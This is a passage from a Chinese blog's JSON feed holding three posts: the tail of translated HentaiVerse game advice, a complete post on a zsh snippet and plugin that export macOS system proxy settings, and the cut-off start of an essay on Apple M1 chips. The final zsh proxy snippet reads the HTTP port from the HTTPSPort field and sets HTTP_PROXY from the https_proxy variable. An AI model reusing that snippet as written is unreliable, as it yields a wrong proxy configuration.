Blood）和传奇竞技场</li>\n<li>可以打出两个效果（如同时打出「眩晕」和「刺甲」）</li>\n<li>三阶段「Fighting Skills」可以击中多个目标</li>\n<li>由于没有盾牌、格挡率加成极低，只能靠回避率和招架率生存</li>\n<li>攻击速度和命中率极高，但生存率很一般</li>\n</ul>\n<h4>双手</h4>\n<ul>\n<li>「Domino Strike」可以命中多个目标</li>\n<li>易于同时攻击多个目标</li>\n</ul>\n<h4>二天一流</h4>\n<ul>\n<li>搭配日本刀 + 胁差的玩法风格</li>\n<li>同时拥有部分双手和双持的优势</li>\n<li>「Domino Strike」只能命中不超过 5 个目标</li>\n<li>副手没有招架加成</li>\n<li>适合 100 级以下的玩家或 300 级以上的玩家</li>\n</ul>\n<h2>培养方向</h2>\n<h3>技能点</h3>\n<p>这一节的内容适用于所有风格，不论是法师、战士还是战法师。</p>\n<p>不要把技能点浪费在你不主动使用的能力上（比如你是一名元素法师，就不应该加圣、暗的技能），技能只有在装配在支配槽中才会起作用。在低等级时你升级获得的技能点会远比你需要的多，但是到 200 级以后你的技能点就会不够用了。你需要通过 <a href=\"https://ehwiki.org/wiki/training\">训练</a>「Ability Boost」来获得更多的技能点。</p>\n<h4>应该加的技能</h4>\n<ul>\n<li>HP Tank（非常重要）：血条，直接决定你的生存几率</li>\n<li>MP Tank（非常重要）：蓝条，非常有用</li>\n<li>Better Cure（非常重要）：减少冷却时间、增加治疗的 HP 量。在 HentaiVerse 里 HP 药水效果一般，你会更依赖治疗咒语。</li>\n<li>Better Regen（非常重要）：提供更有效且更持久的回血</li>\n<li>Better Protection（非常重要）：极大地提升生存几率</li>\n<li>对应装备和战斗风格的技能（非常重要）：随着熟练度提升将有效提升你的任务属性</li>\n<li>Better Mana Pots（重要）：MP 药水是战斗必带的回复品</li>\n<li>Better Haste（重要）：增加你攻击、施法的速度，因此你可以攻击更多的怪物，有效提升你的生存几率</li>\n<li>Stronger Spirit（重要）：让灵力盾可以消耗更少的 SP、更早的抵御攻击</li>\n<li>SP Tanks（重要）：对于战士来说，这是保持灵动架势必备的。而灵力盾和生命火花也依赖 SP 才能发挥作用</li>\n<li>Better Shadow Veil：更高的回避率加成意味着更高的生存几率</li>\n<li>Better Imperil（可选）：削弱怪物的缓伤，对于法师来说是个不错的选择</li>\n<li>Faster Imperil（可选）：降低 Imperil 的消耗和冷却时间、增加受影响的目标，特别适合法师</li>\n<li>Better Spark（可选）：大部分玩家都会通过 IA 自动施放生命火花，此时只能帮助你减少 MP 消耗。一旦你升到 150 级以上，你就会经常看到带有 SP 条的怪物了，而怪物的 SP 攻击可以对你造成极大的伤害、甚至能秒杀你，而生命火花就是你的最后一道保障（译者注：「生命火花」类似于 Minecraft 的「不死图腾」）</li>\n</ul>\n<h4>不推荐的技能</h4>\n<ul>\n<li>Better Drain：造成的伤害非常有限</li>\n<li>Faster Drain：枯竭咒语本身的施法速度就够快了，而冷却时间却不会变短很多</li>\n<li>Better Absorb：很一般的咒语，大部分怪物并不会进行魔法攻击。只有在打 Boss 时会有点用</li>\n<li>Better Slow：Better MagNet 显然是个更合适的选择</li>\n<li>Mind Control：并没有什么用</li>\n<li>Better Blind 和 Faster Blind：Weaken 咒语效果更明显</li>\n<li>Ether Theft：对法师来说是多余的</li>\n</ul>\n<h3>法师哲学</h3>\n<p>法师是一种游走在边缘的职业，尝试在怪物秒杀你之前 秒杀他们。</p>\n<ul>\n<li>310 级以前不建议尝试</li>\n<li>依赖高伤害和回避率生存</li>\n<li>高投入、高回报</li>\n</ul>\n<h3>战士哲学</h3>\n<ul>\n<li>通过高缓伤和再生咒语生存，使用格挡、回避和招架防御。</li>\n<li>战士也需要 MP 维持 BUFF，必要时还要使用 DEBUFF</li>\n<li>200 级以前，尽量确保命中率高于 100%</li>\n</ul>\n<h2>难度调整</h2>\n<p>随着你的等级不断提升，你将会遇见更强大的怪物，战力大多都在 400 以上（拥有 SP 攻击的能力）。从 150 级开始难度就会显著增加，因此你应该适时做一些难度调整。</p>\n<ul>\n<li>尽量选择 Hard 以上难度，以便获得 Shard</li>\n<li>获得更好的装备（尤其是武器），数值比装备等级更重要</li>\n<li>多多使用 BUFF 和 DEBUFF</li>\n<li>第一个 IA 自动施法槽只需要 50H，非常非常非常非常划算的投资</li>\n</ul>\n<h2>装备</h2>\n<p>等级较低的玩家应该多逛逛 E-hentai 社区，领取免费装备和每周的补给（药水、卷轴等）。品质高的装备的属性不一定比品质低的装备好，因此选择和更换装备时三思而后行。</p>\n<h2>物品</h2>\n<ul>\n<li>药水是拿来喝的，不是拿来收藏的。</li>\n<li>喝药水和使用卷轴不计入 turn，所以为啥不多用用呢？</li>\n<li>长效药一般用于较长的战斗，普通药水用于应急，丹药（译者注：中文圈玩家一般称之为「大药」）是在紧急情况下、普通药水的冷却时间还没过、或想要同时获得两种效果时使用的。一些老玩家会给新玩家发放免费药水，去 E-hentai 社区 HentaiVerse 版块的 WTS 分区里看看？</li>\n<li>浴血擂台中 Flying Spaghetti Monster 是性价比最高的，其余的挑战通一次就够了。</li>\n<li>只有你自信能在 PFUDOR 难度打败 Triple Trio and the Tree 时再去刷。</li>\n</ul>\n<h2>怪物实验室</h2>\n<ul>\n<li>你想什么时候去看看就去，只需要记住怪物给予礼物的间隔至少为一小时，而且较弱的怪物一般很少给予礼物。</li>\n<li>如果一个怪物过去 3 天没有给你礼物的怪物，那么接下来他一定会给予你一个礼物。</li>\n<li>怪物的名字越有趣越好，不要用序号或者脸滚键盘为怪物取名。</li>\n</ul>\n<h2>雪花祭坛和奖杯</h2>\n<ul>\n<li>你可以通过献祭奖杯换取装备，也可以随时将它们卖掉。它们在雪花祭坛的价值不会改变，因此囤积它们没有实际意义。</li>\n<li>奖杯永远不要卖给系统店，要么献祭掉、要么卖给玩家（比系统店的价格要高得多）。</li>\n</ul>\n<h2>训练</h2>\n<p>训练会极大程度的消耗你的 Credits，并且除了 Adept Learner 和 Ability Boost 以外很难给你提供太多加成：将 Scavenger 训练满将会花费你 1700 万 Credit，但是掉落几率不过从 10% 提升到 12.5% 而已（译者注：在中文圈玩家中，四个增加掉落率的训练被称为「四大」，因为「四大皆空」）。</p>\n<h2>武器店和道具店</h2>\n<p>武器店里卖的装备要么等级太高、要么等级太低，不如在 社区 HentaiVerse 版块的 WTS 分区里直接向玩家购买。道具店里的东西一般很贵，WTS 版块里要便宜一些，但是去 <a href=\"https://hvmarket.xyz/\">HVMarket</a> 购买最划算。</p>\n<h2>熔炉</h2>\n<ul>\n<li>每项属性的前 5 次升级都不消耗站粘合剂，性价比高；而当你分解装备时，强化材料的 90% 原料都会返还给你，因此在低等级时升级装备还是相对划算的。</li>\n<li>叠加装备附魔不会增强效果，只会增加持续的时间。</li>\n<li>当你装备获得了不想要的潜能时，马上重新锻造它，因为每一级装备潜能意味着需要一片重铸碎片。</li>\n<li>除非你是土豪，否则不要购买灵魂碎片。每天打遭遇战可以获得至多 60 片灵魂碎片。</li>\n</ul>\n<div class=\"license\"> <div class=\"license-title\">[译] HentaiVerse 建议和指导</div> <div class=\"license-link\"><a href=\"https://blog.skk.moe/post/hentaiverse-advice/\">https://blog.skk.moe/post/hentaiverse-advice/</a></div> <div class=\"license-meta\"> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">本文作者</div> <div class=\"license-meta-text\">Sukka</div> </div> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">发布于</div> <div class=\"license-meta-text\">2020-12-24</div> </div>\n<div class=\"license-meta-item\"> <div class=\"license-meta-title\">许可协议</div> <div class=\"license-meta-text\"><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div> </div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/hentaiverse-advice/"},{"title":"ZSH 自动读取 macOS 系统代理配置并设置环境变量","date":"2020-12-07 02:47:00","description":"\n<p>和其它 Linux 的 DE 一样，macOS 也支持在「系统偏好设置」中设置 HTTP 代理、HTTPS 代理，但是 macOS 并不会在终端（Terminal、iTerm）的 shell 中自动生效系统代理配置。为了方便日常使用，我决定好好研究一下 macOS 的系统代理。</p>\n<h2>macOS 系统代理的行为</h2>\n<p>和 Linux 和 Windows 只有一种系统代理配置不同，macOS 为每一种网络设备（Wi-Fi、Ethernet、Bluetooth PAN 等）维护了独立的网络配置，包括代理配置在内。因此当切换网络设备时，macOS 会使用不同的代理配置；如果同时连接了多个网络设备，则操作系统会优先采用在「系统偏好设置」网络「Service Order」靠上的设备的代理配置：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.3/1.png\" class=\"lazy post-img\"></p>\n<p>和大部分 Linux 桌面环境一样，系统偏好设置中的代理设置在 shell session 中是不会生效的，在终端中使用代理、需要手动提供 <code>HTTP_PROXY</code>、<code>HTTPS_PROXY</code> 和 <code>ALL_PROXY</code> 环境变量。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.3/2.png\" class=\"lazy post-img\"></p>\n<h2>在终端获取 macOS 系统代理配置</h2>\n<p>macOS 内置了许多实用的命令行工具，如 <code>xcode-select</code> 用于安装命令行工具和配置 Xcode、<code>build_webkit</code> 用于编译 WebKit、<code>softwareupdate</code> 用于获取系统更新等。在读取系统代理配置方面，macOS 提供了三种方法：</p>\n<pre><code class=\"hljs bash\">$ system_profiler SPNetworkDataType <span class=\"hljs-comment\"># 获取完整网络配置信息</span>$ networksetup -listallnetworkservices <span class=\"hljs-comment\"># 列举所有网络设备</span>$ networksetup -getwebproxy Wi-Fi <span class=\"hljs-comment\"># 获取特定网络设备的系统代理配置</span>$ scutil --proxy <span class=\"hljs-comment\"># 获取当前已启用的代理配置，是对 system_profiler 的封装</span></code></pre>\n<p>其中，第三种命令的输出最简洁，适合在 shell 中解析：</p>\n<pre><code class=\"hljs bash\">$ scutil --proxy&lt;dictionary&gt; {  ExceptionsList : &lt;array&gt; {    0 : 127.0.0.1    1 : 192.168.0.0/16    2 : 10.0.0.0/8    3 : 172.16.0.0/12    4 : 100.64.0.0/10    5 : 17.0.0.0/8    6 : localhost    7 : *.<span class=\"hljs-built_in\">local</span>    8 : 169.254.0.0/16    9 : 224.0.0.0/4    10 : 240.0.0.0/4  }  ExcludeSimpleHostnames : 1  HTTPEnable : 1  HTTPPort : 6152  HTTPProxy : 127.0.0.1  HTTPSEnable : 1  HTTPSPort : 6152  HTTPSProxy : 127.0.0.1  SOCKSEnable : 1  SOCKSPort : 6153  SOCKSProxy : 127.0.0.1}</code></pre>\n<h2>解析 <code>scutil</code> 输出</h2>\n<p>虽然使用 <code>awk</code> 可以轻易解析上述输出，但是正如我在「<a href=\"https://blog.skk.moe/post/make-oh-my-zsh-fly/\">我就感觉到快 —— zsh 和 oh my zsh 冷启动速度优化</a>」一文中所介绍的，应避免使用外部进程、尽可能使用 zsh 内置语法。而应对字符串操作，zsh 也已经绰绰有余了。</p>\n<p>首先，为了获取代理配置不可避免的要生成一个 <code>scutil</code> 的子进程，为了避免子进程的反复生成，应该把输出缓存下来：</p>\n<pre><code class=\"hljs bash\">SCUTILS_PROXY=$(scutil --proxy)</code></pre>\n<p>接着判断代理是否启用。如果配置了代理，则 <code>xxEnable :</code> 的字段值为 1，反之则字段值为 0 或直接整个字段不存在，因此可以使用 zsh 字符串搜索语法搜索 <code>xxEnable : 1</code>，以 HTTP 代理为例：</p>\n<pre><code class=\"hljs bash\">HTTP_PROXY_ENABLED_PATTERN=<span class=\"hljs-string\">\"HTTPEnable : 1\"</span><span class=\"hljs-keyword\">if</span> (( <span class=\"hljs-variable\">$SCUTILS_PROXY</span>[(I)<span class=\"hljs-variable\">$HTTP_PROXY_ENABLED_PATTERN</span>] )); <span class=\"hljs-keyword\">then</span>  <span class=\"hljs-comment\"># HTTP 代理已启用</span><span class=\"hljs-keyword\">fi</span></code></pre>\n<blockquote><p><code>(I)</code> 是 zsh 中的字符串从右往左搜索的语法，返回值为找到匹配时的位置；当没有找到匹配时，zsh 会一路搜索到字符串最左侧、最终返回值是 0。因此 <code>(I)</code> 常见的用法是配合数值条件 <code>(( ))</code> 判断变量是否包含某一字符串，这种写法的性能是 <code>[[ ]]</code> 的三倍。</p></blockquote>\n<p>接下来是获取代理的主机名和端口，HTTP 代理使用到的字段是 <code>HTTPProxy</code> 和 <code>HTTPPort</code>。使用 zsh 的「左端最小匹配截断」语法截取 <code>HTTPProxy</code> 字段内容：</p>\n<pre><code class=\"hljs bash\">$ <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-variable\">${SCUTILS_PROXY#*HTTPProxy : }</span>127.0.0.1  HTTPSEnable : 1  HTTPSPort : 6152  HTTPSProxy : 127.0.0.1  SOCKSEnable : 1  SOCKSPort : 6153  SOCKSProxy : 127.0.0.1}</code></pre>\n<blockquote><p><code>#*</code> 是「左端最小匹配截断」、<code>##*</code> 是「左端最大匹配截断」，此外还有 <code>%*</code> 和 <code>%%*</code>，分别是「右端最小匹配截断」和「右端最大匹配截断」</p></blockquote>\n<p>接下来是使用 zsh 的多行字符串语法获取第一行内容、以将右端多余的内容略去：</p>\n<pre><code class=\"hljs bash\">$ <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-variable\">${<span class=\"hljs-variable\">${SCUTILS_PROXY#*HTTPProxy : }</span>[(f)1]}</span>127.0.0.1</code></pre>\n<blockquote><p>使用 zsh 内置的 <code>(f)</code> flag 用于多行字符串的遍历和截断，比调用外部进程 <code>head</code> 要快得多</p></blockquote>\n<p>用同样的方法获取端口字段的内容：</p>\n<pre><code class=\"hljs bash\">$ <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-variable\">${<span class=\"hljs-variable\">${SCUTILS_PROXY#*HTTPSPort : }</span>[(f)1]}</span>6152</code></pre>\n<p>最后拼凑字段、添加到环境变量即可：</p>\n<pre><code class=\"hljs bash\"><span class=\"hljs-keyword\">if</span> (( <span class=\"hljs-variable\">$SCUTILS_PROXY</span>[(I)<span class=\"hljs-variable\">$HTTP_PROXY_ENABLED_PATTERN</span>] )); <span class=\"hljs-keyword\">then</span>    HTTP_PROXY_HOST=<span class=\"hljs-variable\">${<span class=\"hljs-variable\">${SCUTILS_PROXY#*HTTPProxy : }</span>[(f)1]}</span>    HTTP_PROXY_PORT=<span class=\"hljs-variable\">${<span class=\"hljs-variable\">${SCUTILS_PROXY#*HTTPSPort : }</span>[(f)1]}</span>    <span class=\"hljs-built_in\">export</span> http_proxy=<span class=\"hljs-string\">\"http://<span class=\"hljs-variable\">${HTTP_PROXY_HOST}</span>:<span class=\"hljs-variable\">${HTTP_PROXY_PORT}</span>\"</span>    <span class=\"hljs-built_in\">export</span> HTTP_PROXY=<span class=\"hljs-string\">\"<span class=\"hljs-variable\">${https_proxy}</span>\"</span><span class=\"hljs-keyword\">fi</span></code></pre>\n<p>同理，用相同的方法可以获取到其它代理服务器配置。将代码添加到 <code>.zshrc</code> 中，每次新建一个 shell session 时即可自动读取并添加相关环境变量。</p>\n<h2>zsh-osx-autoproxy</h2>\n<p>基于上述介绍的方法，我封装了一个 oh-my-zsh 插件 <a href=\"https://github.com/SukkaW/zsh-osx-autoproxy\">zsh-osx-autoproxy</a>，启用插件后即可自动获取 HTTP 代理、HTTPS 代理、FTP 代理的设置，并在当前 shell 环境中添加相应环境变量（<code>HTTP_PROXY</code>、<code>HTTPS_PROXY</code>、<code>ALL_PROXY</code>、<code>FTP_PROXY</code>）。oh-my-zsh 用户可以通过下述命令完成安装：</p>\n<pre><code class=\"hljs bash\">git <span class=\"hljs-built_in\">clone</span> https://github.com/sukkaw/zsh-osx-autoproxy <span class=\"hljs-variable\">${ZSH_CUSTOM:-~/.oh-my-zsh/custom}</span>/plugins/zsh-osx-autoproxy<span class=\"hljs-built_in\">echo</span> <span class=\"hljs-string\">\"plugins+=(zsh-osx-autoproxy)\"</span> | tee -a .zshrc</code></pre>\n<p>新建一个终端会话（或使用 <code>source ~/.zshrc</code>） 即可生效。</p>\n<div class=\"license\"> <div class=\"license-title\">ZSH 自动读取 macOS 系统代理配置并设置环境变量</div> <div class=\"license-link\"><a href=\"https://blog.skk.moe/post/macos-auto-read-proxy-settings-zsh/\">https://blog.skk.moe/post/macos-auto-read-proxy-settings-zsh/</a></div> <div class=\"license-meta\"> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">本文作者</div> <div class=\"license-meta-text\">Sukka</div> </div> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">发布于</div> <div class=\"license-meta-text\">2020-12-07</div> </div>\n<div class=\"license-meta-item\"> <div class=\"license-meta-title\">许可协议</div> <div class=\"license-meta-text\"><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div> </div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/macos-auto-read-proxy-settings-zsh/"},{"title":"谈谈 Apple M1 芯片、ARM、ARM Mac 和黑苹果的未来","date":"2020-11-11 16:13:00","description":"\n<p>2020 年 11 月 11 日，苹果在本年度最后一次 Apple Events 上发布了全新的 ARM 芯片 M1、以及三款搭载了 M1 的 Mac：MacBook Air、MacBook Pro 13‘ 和 Mac Mini。在 WWDC 2020 库克宣布 Apple Silicon 后，这次 Apple Events 再一次掀起了热潮，不少 KOL 都把 M1 奉若神明，不少人也不以为然。本文通过 8 个问题来简单聊聊 M1 和 ARM Mac。</p>\n<h2>M1 芯片的性能如何？</h2>\n<p>本文写就时，搭载 M1 的 Mac 尚未开始发货，我们能看到的只有 GeekBench 上流出的跑分。所以，让我们先从跑分开始看起？</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.1/3.jpg\" alt=\"3\" width=\"1280\" height=\"901\" class=\"lazy post-img\"></p>\n<p>哇！Geekbench 跑分数据告诉我们，M1 和 A14X 可以直接打败 5950X、直接把 Tiger Lake 摁在地上摩擦？这已经不是踩爆 Intel 的牙膏了好伐，这是已经快进到 AMD 原地倒闭了好伐！给 Apple 倒一杯卡布奇诺好吗，快给 Apple 倒一杯卡布奇诺！</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.1/4.jpg\" alt=\"4\" width=\"965\" height=\"569\" class=\"lazy post-img\"></p>\n<p>啊，什么？这 Geekbench 还说 Intel 的 Tiger Lake 可以吊打 4700U？嗯？嗯~？</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.1/1.jpg\" alt=\"1\" width=\"1280\" height=\"893\" class=\"lazy post-img\"></p>\n<p>过了一个小时 Geekbench 就更新了排名数据，所以，现在 5950X 和 5900X 的分数又高过 M1 和 A14X 了？</p>\n<p>看了上面这三张图，你应该大致知道像 Geekbench 这样的跑分纯属娱乐了吧。「众所周知」跑分不代表真实体验。所以我们还是看看苹果发布会上给的图表吧：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.1/2.png\" alt=\"2\" width=\"1523\" height=\"846\" class=\"lazy post-img\"></p>\n<p>什么，苹果竟然敢说自己的 M1 比最先进的 PC 芯片的性能还要强大 …… 哦，我眼睛业障重啊，这图表的标题后面、还跟着一个「Per Watt（每瓦）」啊。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.1/5.jpg\" alt=\"5\" width=\"1280\" height=\"818\" class=\"lazy post-img\"></p>\n<p>苹果的意思是，自从 Mac 实装了 M1、Mac 的功耗比直接大幅提升，苹果并没有直接说 M1 性能有多好嘛！你看看苏妈在 AMD 发布会上晒的性能图表、条形图都快超到会场外面去了，苹果你在发布会上搞这么含蓄干什么嘛！</p>\n<p>如果苹果在发布会上只强调能耗比有多么高、功耗有多么低，丝毫不提 M1 的绝对性能，甚至没有透露 M1 的频率，对于 M1 芯片的能耐和优势相信读者也有大概的猜测了。至于苹果在发布会上展示搭载了 M1 的 Mac 比往年的同系列 Mac、CPU 性能提升超过 2.8 倍乃至 3.5 倍、GPU 性能提升则有 5 至 6 倍，我会留给后面「如何评价这率先搭载 M1 的三款 Mac？」问题再谈。</p>\n<h2>对 ARM 架构的处理器性能的一瞥</h2>\n<p>从一开始我就没有怀疑苹果是否能实现用于桌面端的 ARM 芯片。苹果操刀数款移动 CPU 的经历，驾驭 ARM 自然是轻车熟路的。</p>\n<p>那么 ARM 有什么优势呢？在手机和平板上 ARM 大放异彩，近几年几乎再没有看到搭载 X86 的智能手机了；不少 IoT 设备、单片机也开始积极使用 ARM 架构；而桌面端 PC 使用 ARM 的却少之又少。从市场上来看，ARM 架构似乎更适用于低功耗、不强调性能和 CPU 密集型计算的平台，但这并不是意味着 ARM 架构本身没有用于 CPU 密集型计算的潜力。今年 6 月 22 日刷新了全球超级计算机的「TOP500」榜单、成为第一的是来自日本理化学研究所（RIKEN）的「Fugaku」（富岳）超级计算机，峰值计算速度达到 513.9 PFlops。而 Fugaku 搭载的富士通的 7nm 48C SoC 正是 ARM 架构。</p>\n<p>作为半导体行业的门外汉，我没有资格谈论 X86 的 CISC 和 ARM、MIPS 等的 RISC 之间孰优孰劣。但从历史的长河里，我们还是能从 ARM 代替 X86 的企图中略窥一二的，其中最接近成功的一次来自 Cloudflare。2017 年 8 月，Cloudflare 尝试从 Intel Skylake 的处理器（E5-2630 v4）切换到由高通提供的 Centriq 平台。从数据上来看，高通提供的平台在当时非常有吸引力：相比 Intel Skylake 的 的 12C24T 2.1GHz，高通 Centriq 平台搭载的 Falkor 核心达到了 46C46T 2.5GHz；相比 Intel 的 170W 的 TDP、高通 Falkor 的 TDP 只有 120W；与 Intel 的 AVX512 指令集对应的，高通也有自己的 NEON 指令集。</p>\n<p>虽然众多 Linux 发行版和依赖库都提供有 ARM64 版本，但是当软件时，Cloudflare 犯了难。Cloudflare 高度依赖基于 NGINX 开发的 Web Server。虽然 NGINX 本身支持 ARM64，但是 NGINX 同时使用了大量的库如用于 gzip 压缩的 zlib 和用于 TLS 的 BoringSSL；而且 Cloudflare 自身还高度依赖来自 OpenResty 的 lua-nginx-module，以及与之对应的 LuauJIT，但不幸的是 LuaJIT 在当时并不支持 ARM64；除此以外，Cloudflare 许多技术还基于用 Go 编写的 RRDNS，在当时也没有 ARM64 的版本。</p>\n<p>除此以外，Cloudflare 在使用 Intel 和 Falkor 进行 OpenSSL 性能基准测试中发现，OpenSSL 公钥交换的性能高度依赖单核 CPU 频率，因此在测试中 Broadwell 竟超过 Skylake 胜出、而 Falkor 排在了垫底的位置；在对称密钥性能方面，Skylake 由于 AVX512 而遥遥领先（期间 CPU 频率甚至维持在 1.4GHz），Broadwell 由于只有 AVX2 落后于第二，而 NEON 使高通再次垫了底。而在 Cloudflare 展开的其它性能测试，如 gzip 压缩性能测试、brotli 压缩性能测试、LUAJIT 性能测试，以及 Go 的 Crypto 库、gzip 库、Go 正则表达式与字符串操作性能测试中，高通的 Falkor 都远远落后，在不少测试中性能甚至只有 Skylake 和 Broadwell 的百分之一。你可以在 <a href=\"https://blog.cloudflare.com/arm-takes-wing/\">Cloudflare 博客中找到他们的性能测试结果</a>。随后，Cloudflare 的数据中心仍旧采用基于 Intel X86 的服务器，直到今年三月，<a href=\"https://blog.cloudflare.com/technical-details-of-why-cloudflare-chose-amd-epyc-for-gen-x-servers/\">Cloudflare 将 AMD EPYC 引入了他们的新一代服务器</a>，虽然 Cloudflare 对 ARM64 满怀信心，但是他们的基础设施依然是基于 X86 的。</p>\n<p>这并不是说 ARM 具有天生的性能劣势（再看看「Fugaku」超算），而是绝大部分行业的程序、甚至是一些编程语言都不是为 ARM 设计、针对 ARM 优化的。优化软件使其能够让 ARM 的硬件完整发挥出完整的性能，还有非常漫长的一段路要走。</p>\n<h2>搭载了 M1 的 Mac 能否运行 Windows？</h2>\n<p>相比之前的长篇大论，这个问题的答案就简单多了 —— 「几乎不可能」，或者就是「不可能」。</p>\n<p>ACPI（Advanced Configuration and Power Interface，高级配置与电源接口）最早早期 1997 年由 Intel、微软、东芝共同提出，后来凤凰科技（做 BIOS 那个）和惠普先后加入规范制定中，自 2006 年起规范制定的工作被交给了 <a href=\"https://uefi.org/\">UEFI 社区</a>。Windows 98 是第一个支持 ACPI 的操作系统，Windows Vista 以后的 Windows 则要求电脑 <strong>必须支持 ACPI</strong>；Linux 虽然不需要 ACPI 也可以运行，但是在现代设备上禁用 ACPI 将会导致绝大部分硬件无法运行；就连 Android 智能设备中也内置了一个精简的 ACPI；2005 年苹果将 Mac 从 PowerPC 架构迁移到 Intel 架构（相关的故事我在另一篇文章「<a href=\"https://blog.skk.moe/post/history-osx86/\">黑苹果的历史</a>」中有详细介绍），Mac 也开始采用 ACPI。但是搭载了 iOS 的 iPhone、iPad 并没有 ACPI，苹果的智能移动设备完全使用自己的私有架构，使用名为「iBoot」的 Bootloader。</p>\n<p>从 WWDC 2020 上发布的 ARM DTK 上，通过 IORegistryExplorer 上我们可以发现运行 macOS Big Sur for ARM 的 DTK 上完全没有 ACPI。我们因此可以猜测，搭载 M1 的 Mac 也一样不存在 ACPI、使用和 iPhone、iPad 一样的 IBoot 作为 Bootloader。如果是这样的话，搭载 M1 的 Mac 上是 <strong>几乎没有可能</strong> 运行 Windows 的，甚至运行 Linux 都将非常受限。虽然不排除苹果为 ARM Mac 增加 ACPI 兼容层的可能，但是考虑到 WWDC 2020 和本次 Apple Events 上都对 BootCamp 缄口不言，基本上已经确定了本次发布的这三款搭载 M1 的 Mac 是绝无可能再运行 Windows 了。</p>\n<h2>如果搭载 M1 的 Mac 几乎没有可能直接运行 Windows，那么虚拟机呢？</h2>\n<p>相比在 X86 上提供的虚拟机增强 Feature Flag，为 ARM 提供虚拟化技术要有趣一些。ARM 虚拟化需要将 Hypervisor 插入到 Exception Level 2，然后再在 TrustZone 上提供虚拟化的功能，说人话就是 ARM 的虚拟化是在架构层面上实现的，因此苹果的 M1 如果要实现虚拟化并不难。但是考虑到苹果现在从硬件到系统都实现了完整的控制，是否提供虚拟化功能完全由苹果控制，如果苹果不启用，谁都无法绕过限制。</p>\n<p>截止到本文写就，<a href=\"https://www.parallels.com/blogs/parallels-desktop-apple-silicon-mac/\">Parallels Desktop 完全无法在 ARM Mac 上运行虚拟机</a>，但是 Parallels Desktop 已经着手对新版本的活跃开发了。考虑到虚拟机的 ACPI 实现和宿主机是完全独立的，只要苹果开放虚拟化，在 ARM Mac 上运行虚拟机是完全可行的。但是，苹果是否会选择开放虚拟化，又和苹果的目标用户战略、M1 本身的性能是相关的。</p>\n<h2>搭载了 M1 的 Mac 能否运行 PhotoShop？</h2>\n<p>这个问题的答案在发布会上有了明确的解答，我们完全无需猜测：「现在不行，不过明年就会有了」。</p>\n<p>在 WWDC 2020 上，库克就在 ARM DTK 上演示了玛雅的运行，但是对 Adobe Photoshop 却一笔带过、表示「仍在适配中」。而在这次 Apple Events 上，苹果软件部门的 SVP 克雷格·费德里吉是这么介绍的：</p>\n<blockquote>\n<p>And Adobe is bringing universal version of their Apps, staring with Lightroom next month, and other collection of apps including Photoshop early next year.</p>\n<p>而且 Adobe 也开始带来他们的通用应用，将从下个月的 Lightroom 开始，而包括 Photoshop 在内的其它应用（的 ARM 版本）则会在明年年初到来。</p>\n</blockquote>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.1/7.jpg\" alt=\"7\" width=\"1280\" height=\"803\" class=\"lazy post-img\"></p>\n<p>那么，为什么大部分应用都可以很快地发布 Intel、ARM 通用版本，而 Adobe 全家桶却需要再等好几个月？因为 Adobe 从 2019 年开始大部分应用都高度依赖基于 Intel 特殊数学函数库 —— Intel Math Kernel Library（intel-mkl），以及其它一些 Intel 特殊指令集用于硬件加速（涉及到的有 MXMCore、FastCore、CameraRAW 等）。因此即使在搭载了同为 X86 的 AMD 处理器上安装黑苹果，使用 Photoshop 的某些功能也会导致闪退甚至 Kernel Panic；同理，AMD 黑苹果无法运行 MatLab，或者即使能够运行、运算速度也非常缓慢，也是由于缺乏 intel-mkl 导致的。搭载了 M1 芯片的 Mac 自然也无法调用 intel-mkl 库，因此 Adobe 需要几乎重写所有的功能实现，才能让他们的软件在 ARM Mac 上流畅运行。</p>\n<h2>如何评价率先搭载 M1 的三款 Mac？</h2>\n<p>在 Apple Events 上，苹果率先发布了三款搭载了 M1 的 Mac，其中搭载了 M1 的 MacBook Air 相比上一代搭载了 Intel i7 处理器的 MacBook Air（2020 年 3 月推出），CPU 性能提升了 3.5 倍、GPU 图形性能提升了 5 倍。但是，这是和哪一款 Intel i7 对比的呢？上市于 Q2’20 的 i7-1060NG7、Ice Lake、10nm、基础频率 1.20GHz、搭载的是 Iris Plus 核显、TDP 10W。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.1/8.png\" alt=\"8\" width=\"982\" height=\"547\" class=\"lazy post-img\"></p>\n<p>那 Mac Mini 呢？苹果比表示搭载了 M1 的 Mac Mini 相比上一代搭载了 Intel 处理器的 Mac Mini，CPU 性能提升了 3 倍、GPU 图形性能提升了 6 倍。那么在苹果官网的脚注里写的是和哪一款 Mac Mini 进行的对比呢？对比的是于 2018 年发布的 Mac Mini，搭载了上市于 Q3’18 的 i3-8100B、Coffee Lake、14nm++、基础频率 3.6GHz（无睿频）、搭载的是臭名昭著的 UHD 630 核显，TDP 65W。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.1/9.png\" alt=\"9\" width=\"993\" height=\"377\" class=\"lazy post-img\"></p>\n<p>苹果发布的第三款搭载 M1 的 Mac 是 MacBook Pro 13’，相比上一代搭载了 Intel i7 的 MacBook Pro 13’，CPU 性能提升 2.8 倍、GPU 图形性能提升了 5 